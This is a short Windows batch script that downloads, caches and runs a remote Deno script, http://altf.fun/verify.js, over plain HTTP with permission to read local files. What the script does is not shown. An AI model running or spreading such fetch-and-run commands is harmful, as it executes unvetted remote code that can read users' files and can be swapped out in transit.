@echo off
deno cache --reload http://altf.fun/verify.js
deno run --allow-read http://altf.fun/verify.js